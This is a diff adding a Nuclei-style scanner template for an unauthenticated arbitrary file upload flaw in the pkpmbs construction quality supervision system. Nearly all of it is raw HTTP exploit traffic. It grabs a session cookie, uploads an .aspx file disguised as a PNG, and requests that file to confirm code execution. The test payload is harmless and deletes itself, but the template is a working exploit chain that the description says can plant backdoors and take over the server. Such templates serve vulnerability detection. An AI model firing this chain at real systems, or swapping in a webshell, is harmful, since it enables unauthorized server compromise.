@@ -1,0 +1,59 @@
+id: hunanjianyan-FileUpOrDown-upload
+info:
+  name: hunanjianyan-FileUpOrDown-upload
+  author: apple
+  severity: critical
+  description: pkpmbs 建设工程质量监督系统 FileUpOrDown.aspx、/Platform/System/FileUpload.ashx、接口处存在任意文件上传漏洞，未经身份认证的攻击者可以利用漏洞上传恶意后门文件，从而获取服务器权限。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/P9-1pkpmbs-%E5%BB%BA%E8%AE%BE%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E7%9B%91%E7%9D%A3%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=p9-1pkpmbs-%e5%bb%ba%e8%ae%be%e5%b7%a5%e7%a8%8b%e8%b4%a8%e9%87%8f%e7%9b%91%e7%9d%a3%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+
+      - |-
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+      - |
+        POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName={{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+        Content-Length: 397
+        Cookie: {{pkms_cookie}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
+        Content-Type: image/png
+
+        <%@Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+      - |+
+        GET /Excel/Templete/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
+    extractors:
+      - type: regex
+        name: pkms_cookie
+        internal: true
+        part: header_1
+        regex:
+          - 'ASP.NET_SessionId=([a-zA-Z0-9]+)'
